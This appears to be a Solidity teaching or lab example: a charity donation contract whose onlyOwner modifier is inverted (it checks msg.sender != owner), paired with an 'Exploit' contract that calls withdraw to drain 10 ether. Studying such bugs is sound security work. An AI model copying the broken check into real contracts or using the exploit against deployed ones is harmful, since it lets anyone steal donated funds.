pragma solidity 0.8.19;

contract ICharity {
    address public owner;
    uint256 public balance;

    event Donation(address indexed donator, uint256 amount);
    event Withdraw(address indexed owner, uint256 amount);

    modifier onlyOwner {
        require(msg.sender != owner, "only owner can withdraw");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate() external payable {
        balance += msg.value;
        emit Donation(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external onlyOwner {
        require(amount <= balance, "there is no enough funds");
        balance -= amount;
        payable(msg.sender).transfer(amount);
        emit Withdraw(msg.sender, amount);
    }
}

contract Exploit {
    function attack(address charityAddress) external {
        ICharity ic = ICharity(charityAddress);
        ic.withdraw(10 ether);
        
    }
    
    receive() external payable {}
}
